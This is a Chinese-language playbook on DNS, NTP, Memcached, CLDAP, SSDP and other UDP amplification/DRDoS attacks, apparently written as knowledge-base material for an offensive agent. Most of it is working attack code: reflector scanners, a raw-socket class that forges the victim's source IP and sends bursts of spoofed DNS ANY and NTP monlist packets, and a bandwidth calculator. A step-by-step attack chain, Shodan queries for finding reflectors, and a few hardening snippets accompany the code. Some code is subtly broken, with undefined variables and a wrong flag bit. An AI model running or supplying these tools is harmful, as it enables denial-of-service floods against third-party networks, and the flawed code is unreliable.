# Amplification / DRDoS Attacks

## 场景

攻击者利用 UDP 无连接特性伪造源 IP 地址，向公共服务发送小请求（几十字节），使响应发送到受害目标（反射），并且响应远大于请求（放大）。DRDoS (Distributed Reflection DoS) 是迄今为止出现过的最强 DDoS 向量 — 单台服务器即可产生数十 Gbps 流量。

典型模式：

```
攻击者
   |-- 伪造源 IP = 受害者
   |-- 发送小查询到开放反射器
   v
反射器群 (DNS/NTP/Memcached/CLDAP)
   |-- 响应发送给受害者 (反射)
   |-- 响应大小 x10 ~ x50,000 请求大小 (放大)
   v
受害者 (带宽打满)
```

典型目标：
- 缺乏 BCP38 源认证的网络中的任意目标
- 云和托管服务 (AWS/GCP/Azure 出口流量计费)
- 游戏服务器 / VoIP 基础设施 / ISP 核心

## 输入信号

- 来自不同源端口、相同源 IP (伪造 IP) 的 UDP 流量洪泛
- 单 IP 在短时间内接收大量 DNS/NTP/CLDAP 响应，但该 IP 从未发送请求
- 响应中包含 `IN.ANY` 或 `monlist` 等非正常查询内容
- 网络流量 profile 显示极高 PPS (packet-per-second) 且 packet 大小异常均匀
- 受害 IP 的 netflow 显示源端口多为 UDP 123/53/389/1900/3702
- BGP FlowSpec / RTBH 路由无效 — 流量来自分散的源 AS

---

## 方法 1: DNS Amplification

### 原理

DNS (UDP 53) 是最大的放大向量之一。攻击者发送短查询 (`ANY` 或 `DNSSEC ANY` 类型)，使 DNS 服务器返回远超查询大小的响应。

### 放大计算

```
请求:    ANY IN example.com.    → 约 40 bytes
响应:    example.com. IN ANY
        包括: A/AAAA/MX/NS/TXT/SOA/...  → 约 3000-4000 bytes

基础放大系数: ~70x (ANY 查询)
DNSSEC 签名记录: ~3500 bytes → ~87x

在 IPv6 + EDNS0 + DNSSEC 组合下:
  请求: 60 bytes (IPv6 header + UDP + DNS)
  响应: 4200 bytes (大量 DNSSEC 签名)
  放大系数: 70x

带宽计算:
  单服务器 1Gbps 上行 → 发送 2,000,000 pps
  响应大小 3500 bytes → 7 Gbps 反射流量
  10 台 DNS 服务器: 70 Gbps
  1000 台 (开放解析器放大): 7 Tbps
```

### 开放解析器分布

```
全球开放 DNS 解析器数量(2023):
  - China: ~300,000
  - US: ~200,000
  - Brazil: ~80,000
  - 全球合计: ~1,200,000+

攻击者无需控制这些服务器，仅需:
  1. 扫描到开放解析器 (使用 reflection scan)
  2. 发送伪造源 IP 的查询
  3. 响应自动发向受害目标
```

### 代码: DNS 放大扫描器

```python
import asyncio
import struct
import random
import socket
from typing import Optional, Any
from dataclasses import dataclass, field

@dataclass
class DNSResponse:
    src_addr: str
    response_size: int
    amplification_ratio: float
    flags: list[str]
    answers: int
    rcode: str

class DNSAmplificationScanner:
    """扫描开放 DNS 解析器并计算放大系数"""

    # DNS 查询类型
    QRY_TYPES = {
        "ANY": 255,
        "DNSSEC_ANY": 255,  # 带 DNSSEC OK 位
        "TXT": 16,
        "MX": 15,
        "SOA": 6,
    }

    def __init__(self, query_domain: str = "isc.org",
                 qtype: str = "ANY"):
        self.qtype = qtype
        self.domain = query_domain
        self.query_id = random.randint(0, 0xFFFF)

    def _build_dns_query(self, dnssec_ok: bool = False) -> bytes:
        """构造 DNS 查询包

        格式: DNS Header (12 bytes) + Question (variable)
        """
        # DNS Header
        header = struct.pack(">H", self.query_id)   # ID
        flags = 0x0100  # Standard query, RD=1

        if dnssec_ok:
            flags |= 0x8000  # 设置 EDNS0 的 DNSSEC OK 位

        header += struct.pack(">H", flags)
        header += struct.pack(">HHHH", 1, 0, 0, 0)  # QDCOUNT, AN, NS, AR

        # Question
        question = b""
        for part in self.domain.split("."):
            question += bytes([len(part)]) + part.encode()
        question += b"\x00"
        question += struct.pack(">HH", self.QRY_TYPES.get(self.qtype, 255), 1)

        # EDNS0 OPT RR (用于增加响应大小)
        if dnssec_ok:
            opt_rr = (
                b"\x00"          # name (root)
                b"\x00\x29"      # type: OPT
                b"\x10\x00"      # UDP payload: 4096
                b"\x00\x00\x00\x00"  # RCODE + version
                b"\x00\x0f"      # flags: DNSSEC OK
                b"\x00\x10"      # RDATA length
            )
            # 添加 NSID 或其他可选 option
            question += opt_rr

        return header + question

    @staticmethod
    def parse_dns_response(data: bytes) -> dict[str, Any]:
        """简单解析 DNS 响应头部"""
        if len(data) < 12:
            return {"valid": False}

        flags = struct.unpack(">H", data[2:4])[0]
        qr = (flags >> 15) & 1
        opcode = (flags >> 11) & 0xF
        aa = (flags >> 10) & 1
        tc = (flags >> 9) & 1
        rd = (flags >> 8) & 1
        ra = (flags >> 7) & 1
        rcode = flags & 0xF

        ancount = struct.unpack(">H", data[6:8])[0]
        nscount = struct.unpack(">H", data[8:10])[0]

        rcode_map = {0: "NOERROR", 2: "SERVFAIL", 3: "NXDOMAIN", 5: "REFUSED"}

        return {
            "valid": True,
            "qr": qr,
            "rcode": rcode_map.get(rcode, f"RCODE{rcode}"),
            "ancount": ancount,
            "nscount": nscount,
            "tc": bool(tc),
            "ra": bool(ra),
        }

    async def probe(self, resolver_ip: str, timeout_sec: float = 3,
                    dnssec: bool = True) -> Optional[DNSResponse]:
        """探测单个 DNS 解析器的放大系数"""
        loop = asyncio.get_event_loop()

        query = self._build_dns_query(dnssec_ok=dnssec)
        query_size = len(query)

        transport, protocol = await loop.create_datagram_endpoint(
            lambda: asyncio.DatagramProtocol(),
            remote_addr=(resolver_ip, 53),
        )

        try:
            transport.sendto(query)

            # 等待响应
            response_data = await asyncio.wait_for(
                self._receive_response(transport, protocol),
                timeout=timeout_sec
            )

            response_size = len(response_data)
            parsed = self.parse_dns_response(response_data)

            if parsed.get("valid") and parsed.get("qr"):
                return DNSResponse(
                    src_addr=resolver_ip,
                    response_size=response_size,
                    amplification_ratio=response_size / max(query_size, 1),
                    flags=[f for f in ["AA", "TC", "RD", "RA"]
                           if parsed.get(f.lower())],
                    answers=parsed.get("ancount", 0),
                    rcode=parsed.get("rcode", "UNKNOWN"),
                )
        except asyncio.TimeoutError:
            pass
        except Exception:
            pass
        finally:
            transport.close()

        return None

    async def _receive_response(self, transport, protocol,
                                 max_size: int = 4096):
        """接收 UDP 响应"""
        future = loop.create_future()
        original_datagram_received = protocol.datagram_received

        def datagram_received(data, addr):
            if not future.done():
                future.set_result(data)
            original_datagram_received(data, addr)

        protocol.datagram_received = datagram_received
        return await future

    async def scan_network(self, resolvers: list[str],
                            concurrency: int = 100) -> list[DNSResponse]:
        """批量扫描 DNS 解析器"""
        semaphore = asyncio.Semaphore(concurrency)

        async def scan_one(ip):
            async with semaphore:
                return await self.probe(ip)

        tasks = [scan_one(ip) for ip in resolvers]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        valid = [r for r in results if isinstance(r, DNSResponse)]
        valid.sort(key=lambda r: r.amplification_ratio, reverse=True)

        if valid:
            best = valid[0]
            print(f"[!] Max amplification: {best.amplification_ratio:.0f}x"
                  f" ({best.response_size}B from {best.src_addr})")
            print(f"    Query size: {len(self._build_dns_query())}B")
            print(f"    Potential: {best.response_size * 1000000 / 1e9:.1f}TB"
                  f" with 1M resolvers")

        return valid


# 使用:
# scanner = DNSAmplificationScanner(query_domain="isc.org", qtype="ANY")
# # 从公开的开放解析器列表中抽样
# resolvers = ["8.8.8.8", "1.1.1.1", "208.67.222.222", ...]
# results = asyncio.run(scanner.scan_network(resolvers))
```

### DNS 放大防御

```python
class DNSAmplificationMitigation:
    """DNS 放大防御措施 — 服务端"""

    @staticmethod
    def configure_response_rate_limiting(bind_config_path: str) -> str:
        """BIND RRL 配置"""
        return '''
        # named.conf 片段 — Response Rate Limiting
        options {
            rate-limit {
                responses-per-second 5;
                window 5;
                log-only no;
                exempt-clients { 10.0.0.0/8; 172.16.0.0/12; };
            };
        };
        '''

    @staticmethod
    def configure_acl_restriction() -> str:
        """DNS 访问控制 — 仅允许合法客户端"""
        return '''
        acl "trusted" {
            10.0.0.0/8;
            172.16.0.0/12;
            192.168.0.0/16;
            localhost;
        };
        options {
            allow-query { trusted; };
            allow-recursion { trusted; };
            allow-query-cache { trusted; };
        };
        '''

    @staticmethod
    def risks_of_disabling():
        """关闭递归查询的风险分析"""
        # 将递归限制到内部网络
        # 对 ALL 外部查询返回 REFUSED
        pass
```

---

## 方法 2: NTP Monlist Amplification

### 原理

NTP `monlist` (MON_GETLIST) 命令返回与该 NTP 服务器最近通信的最后 600 个客户端 IP。响应包极其庞大：

```
攻击者 → NTP 服务器 (伪造源 IP = 受害者):
  REQ: monlist 请求 (8 bytes)
  RES: 600 个 IP × 每个 12 字节 = 7200 bytes (≈ 60 packets)

放大系数: ~500x (实际测量可达 556x)

历史:
  - 2014 年曾观测到 400 Gbps NTP 放大攻击 (CloudFlare)
  - 当时全球约 400,000 台开放 NTP 服务器
  - 修复: NTP 4.2.7p26+ 默认禁用 monlist
```

### NTP 放大扫描

```python
import socket
import struct

class NTPAmplificationScanner:
    """NTP monlist 放大扫描"""

    MONLIST_REQUEST = b'\x17\x00\x03\x2a' + b'\x00' * 4

    def __init__(self):
        self.ntp_version = 4
        self.mode = 7  # 7 = MODE_PRIVATE (monlist 在此模式)

    def _build_monlist_request(self) -> bytes:
        """构造 NTP monlist 请求"""
        # NTP private mode header
        req = struct.pack("!BB", (self.ntp_version << 3) | self.mode, 0)
        req += struct.pack("!HHI", 0, 0, 0)  # Sequence, Status, Association ID
        req += struct.pack("!HH", 42, 0)     # Implementation (42=monlist), Timestamp
        return req

    def measure_amplification(self, ntp_server: str,
                              timeout_sec: float = 3) -> dict:
        """测量单个 NTP 服务器的放大系数"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(timeout_sec)

        query = self._build_monlist_request()
        query_size = len(query)

        try:
            start = time.time()
            sock.sendto(query, (ntp_server, 123))
            response, _ = sock.recvfrom(65535)
            elapsed = time.time() - start

            ratio = len(response) / max(query_size, 1)

            return {
                "server": ntp_server,
                "query_size": query_size,
                "response_size": len(response),
                "amplification_ratio": ratio,
                "packets": len(response) // 600 + 1,  # 估算
                "rtt_ms": round(elapsed * 1000, 1),
                "vulnerable": ratio > 50,
            }
        except socket.timeout:
            return {"server": ntp_server, "vulnerable": False, "error": "timeout"}
        except Exception as e:
            return {"server": ntp_server, "vulnerable": False, "error": str(e)}
        finally:
            sock.close()
```

---

## 方法 3: Memcached UDP Amplification

### 原理

Memcached (UDP 11211) 曾以 **50,000x** 的放大系数保持历史记录。即使在 2024 年，仍有大量被暴露的 Memcached 服务器。

```
请求 (15 bytes):
  \x00\x00\x00\x00\x00\x01\x00\x00  # Magic + Opcode GET + Key
  stats\r\n

响应 (750,000 bytes):
  统计信息: uptime, version, curr_items, bytes, ...
  包含大量服务器内存中的缓存数据

放大系数: 50,000x

真实案例:
  2018.02: GitHub 遭遇 1.35 Tbps DDoS (使用 Memcached)
  攻击者利用: ~100,000 台暴露 Memcached 服务器
  每个响应: 最大 UDP 包 1400 bytes × 约 500 个包 = 700KB
  请求: 15 bytes
```

### 代码: Memcached 放大探测

```python
async def memcached_amplification(server: str,
                                   key: str = "stats") -> dict:
    """探测 Memcached 服务器的放大系数"""

    # Memcached UDP 请求头 (8 bytes) + 数据
    req_id = random.randint(0, 0xFFFF)

    # GET 请求: magic(1) + opcode(1) + key_len(2) + extras(4) + ...
    # 简洁方式: 直接发送 "stats\r\n"
    query = b"\x00" * 8  # request header (all zeros)
    query += struct.pack(">H", req_id)  # request ID
    query += b"\x00\x00"  # sequence number
    query += b"\x00\x00\x00\x00"  # total datagram length (unknown)
    query += b"\x00\x00\x00\x00"  # reserved
    # Add actual stats command
    query += b"stats\r\n"

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(3)

    try:
        sock.sendto(query, (server, 11211))

        total = 0
        packets = 0
        while True:
            data, addr = sock.recvfrom(65535)
            total += len(data)
            packets += 1

        return {"server": server, "response_bytes": total,
                "packets": packets, "query_bytes": len(query)}
    except socket.timeout:
        return {"server": server, "response_bytes": total,
                "packets": packets, "query_bytes": len(query)}
    except Exception as e:
        return {"server": server, "error": str(e)}
    finally:
        sock.close()
```

### Memcached 防御

```python
class MemcachedHardening:
    """Memcached 加固"""

    @staticmethod
    def disable_udp(config_path: str = "/etc/memcached.conf") -> str:
        """在配置中禁用 UDP"""
        return '''
# /etc/memcached.conf
# 禁用 UDP — 仅监听 TCP
-p 11211
-U 0         # UDP port = 0 → 禁用
-l 127.0.0.1 # 仅回环接口监听
'''

    @staticmethod
    def iptables_block():
        """防火墙阻止外部 Memcached 访问"""
        return """
iptables -A INPUT -p udp --dport 11211 -s 127.0.0.1 -j ACCEPT
iptables -A INPUT -p udp --dport 11211 -j DROP
iptables -A INPUT -p tcp --dport 11211 -s 127.0.0.1 -j ACCEPT
iptables -A INPUT -p tcp --dport 11211 -j DROP
"""
```

---

## 方法 4: CLDAP / WS-Discovery / SSDP 放大

### CLDAP (Connection-less Lightweight Directory Access Protocol)

```
端口: UDP 389
请求: CLDAP rootDSE 查询 (约 50 bytes)
响应: 目录服务信息 (约 4000 bytes)
放大系数: ~80x

特点:
  - 不需要认证
  - 默认在 AD 域控制器上启用
  - 2019 年出现大规模 CLDAP 放大攻击
```

### WS-Discovery (Web Services Dynamic Discovery)

```
端口: UDP 3702
请求: Probe 消息 (multicast) (约 500 bytes)
响应: Probe Match (约 5000-10000 bytes)
放大系数: ~10-50x

特点:
  - Windows 10/11, Server 2016+ 默认启动
  - 用于网络设备发现 (打印机, 投影仪, NAS)
  - 2019 年出现大规模利用
```

### SSDP (Simple Service Discovery Protocol)

```
端口: UDP 1900
请求: M-SEARCH (约 50 bytes)
响应: 设备描述 (约 750 bytes)
放大系数: ~15x

特点:
  - UPnP 设备，广泛存在于消费级路由器
  - 攻击者扫描 Shodan 搜索 "UPnP" 获取目标
```

### 代码: 多向量放大扫描

```python
import asyncio
import struct
import ipaddress
from dataclasses import dataclass

@dataclass
class AmplificationVector:
    """放大向量探测结果"""
    protocol: str
    server: str
    port: int
    query_size: int
    response_size: int
    ratio: float
    vulnerable: bool

class MultiVectorAmplificationScanner:
    """多协议放大扫描器"""

    PROBES = {
        "CLDAP": {
            "port": 389,
            "payload": (
                b"0\x84\x00\x00\x00\x1e\x04\x00\x0a\x01\x00"
                b"\x0a\x01\x00\x02\x01\x00\x02\x01\x00\x01\x01"
                b"\x00'\x0f\x00\x00\x00\x00\x00\x00\x00\x00"
            ),
        },
        "SSDP": {
            "port": 1900,
            "payload": (
                b"M-SEARCH * HTTP/1.1\r\n"
                b"HOST: 239.255.255.250:1900\r\n"
                b"MAN: \"ssdp:discover\"\r\n"
                b"MX: 1\r\n"
                b"ST: ssdp:all\r\n"
                b"\r\n"
            ),
        },
        "WS-Discovery": {
            "port": 3702,
            "payload": (
                b'<?xml version="1.0" encoding="utf-8"?>\n'
                b'<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"'
                b' xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing"'
                b' xmlns:wsd="http://schemas.xmlsoap.org/ws/2005/04/discovery">\n'
                b'<soap:Header>\n'
                b'<wsa:Action>http://schemas.xmlsoap.org/ws/2005/04/discovery/Probe</wsa:Action>\n'
                b'<wsa:MessageID>uuid:00000000-0000-0000-0000-000000000000</wsa:MessageID>\n'
                b'<wsa:To>urn:schemas-xmlsoap-org:ws:2005:04:discovery</wsa:To>\n'
                b'</soap:Header>\n'
                b'<soap:Body>\n'
                b'<wsd:Probe>\n'
                b'<wsd:Types>wsd:Device</wsd:Types>\n'
                b'</wsd:Probe>\n'
                b'</soap:Body>\n'
                b'</soap:Envelope>\n'
            ),
        },
    }

    async def probe_vector(self, server: str, protocol: str,
                            timeout: float = 3) -> AmplificationVector:
        """探测单个放大向量"""
        cfg = self.PROBES[protocol]
        query = cfg["payload"]

        loop = asyncio.get_event_loop()
        transport, protocol_obj = await loop.create_datagram_endpoint(
            lambda: asyncio.DatagramProtocol(),
            remote_addr=(server, cfg["port"]),
        )

        try:
            transport.sendto(query)

            future = loop.create_future()
            orig_recv = protocol_obj.datagram_received

            def _recv(data, addr):
                if not future.done():
                    future.set_result(data)
                orig_recv(data, addr)

            protocol_obj.datagram_received = _recv

            response = await asyncio.wait_for(future, timeout=timeout)
            ratio = len(response) / max(len(query), 1)

            return AmplificationVector(
                protocol=protocol,
                server=server,
                port=cfg["port"],
                query_size=len(query),
                response_size=len(response),
                ratio=round(ratio, 1),
                vulnerable=ratio > 10,
            )
        except asyncio.TimeoutError:
            return AmplificationVector(
                protocol, server, cfg["port"],
                len(query), 0, 0, False
            )
        except Exception as e:
            return AmplificationVector(
                protocol, server, cfg["port"],
                len(query), 0, 0, False
            )
        finally:
            transport.close()
```

---

## 方法 5: SNMP / Chargen / QOTD 遗留向量

### SNMP (Simple Network Protocol)

```
端口: UDP 161
请求: GETBULK (约 60 bytes)
响应: 大量 OID 值 (约 5000 bytes)
放大系数: ~80x

SNMPv2/v3 需要 community string (默认 public/private)
大量设备使用默认 community → 可利用
```

### Chargen (Character Generator)

```
端口: UDP 19
请求: 任意字符 (约 1 byte)
响应: 无限字符流 (发送到连接关闭)
放大系数: ∞ (理论上)

Chargen 一般用于测试，不应暴露在公网
```

### QOTD (Quote of the Day)

```
端口: UDP 17
请求: 任意数据 (约 1 byte)
响应: 引文 (约 200-500 bytes)
放大系数: ~200-500x

同样不应在公网暴露
```

---

## 方法 6: IP Spoofing — 伪造源地址

### 原理

DRDoS 的根基在于 **IP 源地址伪造**。攻击者实际控制的机器发送 IP 包时，将源 IP 字段设为受害者的 IP，使反射器将响应发送给受害者。

```python
import socket
import struct

class RawSocketSpoofer:
    """原始套接字 IP 源地址伪造 (需要 root/管理员权限)"""

    def __init__(self, src_ip: str, dst_ip: str):
        """伪造源 IP 的原始发包"""
        self.src = src_ip
        self.dst = dst_ip

    def create_raw_socket(self) -> socket.socket:
        """创建原始套接字 (Linux: AF_INET + SOCK_RAW + IPPROTO_RAW)"""
        # Linux
        import platform
        if platform.system() == "Linux":
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW,
                                 socket.IPPROTO_RAW)
            # 需要设置 IP_HDRINCL 以允许自定义 IP header
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            return sock
        else:
            raise RuntimeError("Raw sockets require elevated privileges")

    def _ip_header(self, protocol: int = 17, payload_len: int = 20) -> bytes:
        """构造 IP header"""
        version_ihl = 0x45  # IPv4, IHL=5 (20 bytes)
        dscp_ecn = 0
        total_len = 20 + payload_len
        identification = 0x0000
        flags_offset = 0x4000  # Don't Fragment
        ttl = 64
        checksum = 0  # 内核或 NIC 会计算

        header = struct.pack("!BBHHHBBH",
            version_ihl, dscp_ecn, total_len,
            identification, flags_offset,
            ttl, protocol, checksum,
        )
        # 源和目标 IP
        header += socket.inet_aton(self.src)
        header += socket.inet_aton(self.dst)

        return header

    def _udp_header(self, src_port: int, dst_port: int,
                    payload_len: int) -> bytes:
        """构造 UDP header (用于 UDP 放大反射攻击)"""
        length = 8 + payload_len
        header = struct.pack("!HHHH", src_port, dst_port, length, 0)
        return header

    def build_ntp_monlist_packet(self) -> bytes:
        """构造伪造源 IP 的 NTP monlist 请求包"""
        payload = b'\x17\x00\x03\x2a' + b'\x00' * 4
        udp = self._udp_header(
            src_port=random.randint(1024, 65535),
            dst_port=123,
            payload_len=len(payload)
        )
        ip = self._ip_header(protocol=17, payload_len=len(udp) + len(payload))
        return ip + udp + payload

    def build_dns_any_packet(self) -> bytes:
        """构造伪造源 IP 的 DNS ANY 查询包"""
        # DNS query: ANY isc.org
        query_id = random.randint(0, 0xFFFF)
        dns = struct.pack(">H", query_id)  # ID
        dns += struct.pack(">H", 0x0100)  # standard query, RD=1
        dns += struct.pack(">HHHH", 1, 0, 0, 0)

        # Question: isc.org
        for p in ["isc", "org"]:
            dns += bytes([len(p)]) + p.encode()
        dns += b"\x00"
        dns += struct.pack(">HH", 255, 1)  # QTYPE=ANY, QCLASS=IN

        # UDP header
        udp = self._udp_header(
            src_port=random.randint(1024, 65535),
            dst_port=53,
            payload_len=len(dns)
        )
        ip = self._ip_header(protocol=17, payload_len=len(udp) + len(dns))
        return ip + udp + dns

    def send_packet(self, packet: bytes):
        """发送伪造包"""
        sock = self.create_raw_socket()
        try:
            sock.sendto(packet, (self.dst, 0))
        finally:
            sock.close()

    def send_burst(self, packet_count: int = 1000):
        """高速发送伪造包"""
        sock = self.create_raw_socket()
        try:
            for _ in range(packet_count):
                sock.sendto(
                    self.build_dns_any_packet(),
                    (self.dst, 0)
                )
        finally:
            sock.close()


# 注意: 原始套接字需要管理员权限
# Windows: 以管理员身份运行
# Linux: sudo / CAP_NET_RAW capability
```

---

## 方法 7: 现代放大向量 — DTLS/QUIC / TCP Middlebox

### DTLS Reflection

```
DTLS (Datagram TLS) 运行在 UDP 上:
  端口: UDP 443 (常用于 WebRTC/VoIP)

攻击:
  客户端发送 ClientHello (约 250 bytes)
  服务器回复 HelloVerifyRequest + Certificate (约 3000 bytes)

放大系数: ~12x

特点:
  - DTLS 1.0/1.2 对反射较为脆弱
  - DTLS 1.3 引入 HelloRetryRequest cookie 缓解
  - 但仍可用于放大 (cookie 机制可被绕过)
```

### QUIC Reflection

```
QUIC (HTTP/3) 运行在 UDP 443:
  版本 1: 使用 Retry token 缓解反射
  但初始握手仍可放大:
    Initial packet (约 1200 bytes)
    Retry/Version Negotiation (约 1200 bytes)

放大系数: ~1x (有限)
  但如果目标支持版本协商 → 发送大量 Version Negotiation 包
```

### CVE-2022-32293 — TCP Middlebox Reflection

```
原理:
  AWS Network Load Balancer / F5 / 某些中间盒在处理 TCP 连接时
  发送 RST 或 SYN-ACK 到伪造源 IP

放大系数: ~100x
  攻击者发送小 SYN 包 (60 bytes)
  中间盒回复 MSS 配置响应 (6000 bytes)

影响:
  AWS NLB (已修复)
  F5 BIG-IP (CVE-2022-32293)
  部分 CDN 边缘节点
```

---

## 方法 8: 基于放大系数的攻击容量计算

```python
class AttackCapacityCalculator:
    """DRDoS 攻击容量计算器"""

    # 已知放大系数
    AMPLIFICATION_FACTORS = {
        "DNS_ANY": 70,
        "DNS_DNSSEC": 90,
        "NTP_MONLIST": 556,
        "MEMCACHED": 50000,
        "CLDAP": 80,
        "SSDP": 15,
        "WS_DISCOVERY": 30,
        "SNMP": 80,
        "CHARGEN": 1000,
        "QOTD": 300,
        "DTLS": 12,
    }

    @staticmethod
    def calculate_bandwidth(attackers: int, per_attacker_bw_mbps: int,
                             reflectors: int, amplification_factor: int) -> dict:
        """计算攻击总带宽

        Args:
            attackers: 攻击者控制的机器数量
            per_attacker_bw_mbps: 每个攻击者的上行带宽 (Mbps)
            reflectors: 可用反射器数量
            amplification_factor: 放大系数
        """
        # 攻击者总发送带宽
        attacker_total_mbps = attackers * per_attacker_bw_mbps

        # 每个攻击者每秒能发送的查询数
        query_size_bytes = 50
        pps_per_attacker = (per_attacker_bw_mbps * 1_000_000 // 8) // query_size_bytes

        # 反射后总量
        response_size_bytes = query_size_bytes * amplification_factor
        total_response_mbps = (
            attackers * pps_per_attacker * response_size_bytes * 8 / 1_000_000
        )

        return {
            "attacker_total_bw_mbps": attacker_total_mbps,
            "pps_per_attacker": pps_per_attacker,
            "reflector_count": reflectors,
            "amplification_factor": amplification_factor,
            "estimated_attack_bw_gbps": round(total_response_mbps / 1000, 2),
            "estimated_packets_per_sec": attackers * pps_per_attacker,
        }

    @staticmethod
    def compare_vectors():
        """比较各放大向量的效率"""
        results = []
        for vector, factor in sorted(
            AttackCapacityCalculator.AMPLIFICATION_FACTORS.items(),
            key=lambda x: x[1], reverse=True
        ):
            # 假设 10 台攻击机，每台 1Gbps，1000 台反射器
            bw = AttackCapacityCalculator.calculate_bandwidth(
                attackers=10,
                per_attacker_bw_mbps=1000,
                reflectors=1000,
                amplification_factor=factor
            )
            results.append({
                "vector": vector,
                "factor": factor,
                "est_gbps": bw["estimated_attack_bw_gbps"],
            })

        return results


# 计算示例:
# calc = AttackCapacityCalculator()
# results = calc.compare_vectors()
# for r in results:
#     print(f"{r['vector']:20s} {r['factor']:>6}x  →  {r['est_gbps']:>8.2f} Gbps")
```

---

## 攻击链

```
侦察阶段:
  1. Shodan / Censys 搜索开放反射器 (DNS/NTP/Memcached/CLDAP)
  2. 验证放大系数 (发送 Probe 查询)
  3. 确定受害目标 IP

攻击阶段:
  4. 在攻击机上准备伪造 RAW 套接字
  5. 构造反射查询包 (源 IP = 受害者)
  6. 向所有反射器地址发送查询
  7. 反射器同时向受害者发送放大的响应

规模化阶段:
  8. 多个攻击者 (botnet) 同时向不同反射器段发送
  9. 流量汇聚到受害者上行链路
  10. 链路饱和 → 正常流量丢弃

防御失效:
  11. ISP 级 ACL 对伪源 IP 无效 (BCP38 未部署)
  12. Cloudflare/AWS Shield 需要 on-ramp 时间
  13. 流量来自 10 万+ 不同源 AS → BGP Flowspec 规则数量爆炸
```

## MCP 工具映射

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| 探测反射器 | `http_probe` | 探测公网反射器的可用性和响应 |
| 技术搜索 | `kb_router` | 搜索 dns_amplification / memcached_drdos 等 |
| 技术查阅 | `kb_read_file` | 读取本文件或相关放大攻击技术 |
| 辅助探测 | `run_ctf_tool` | 调用 dirsearch / 其他 CTF 工具辅助扫描 |

## 参考资料

1. CVE-1999-0105 — NTP monlist 放大 (首次记录)
2. CVE-2013-5211 — NTP 放大攻击
3. "Memcached 1.3.5 Tbps DDoS" — GitHub blog, 2018.03
4. CVE-2022-32293 — TCP Middlebox Reflection (AWS NLB / F5)
5. "DNS Amplification Attack Overview" — DNSFlagDay.net
6. BCP38 — Network Ingress Filtering (RFC 2827)
7. "An Analysis of Using Reflectors for DDoS" — Paxson, 2001
8. "Understanding and Mitigating NTP-based DDoS Attacks" — US-CERT TA14-013A
9. SHODAN search queries: `port:11211 "stats"`, `port:123 "monlist"`, `port:389 rootDSE`
10. CVE-2024-27316 — HTTP/2 CONTINUATION flood (also applicable to reflection)
11. DTLS amplification analysis — IEEE Communications Surveys, 2022
12. "A survey of DDoS amplification attacks" — Ryba et al., 2015
13. Open resolver project: openresolverproject.org

## 证据与验证闭环

- 保存 baseline 与单变量 probe 的完整请求、响应状态、关键响应头和正文摘要。
- 将“响应差异”与服务端副作用分开记录；只有权限、状态、数据或 Flag 可重复变化才算确认。
- 从全新 session/重置状态最小化重放，记录依赖、并发参数、时间窗口及失败样本。
- 输出统一放入 `exports/ctf-website/<case>/`，凭据只用 `REDACTED` 占位，自动检索 `flag{}`、`CTF{}`、`DASCTF{}`。
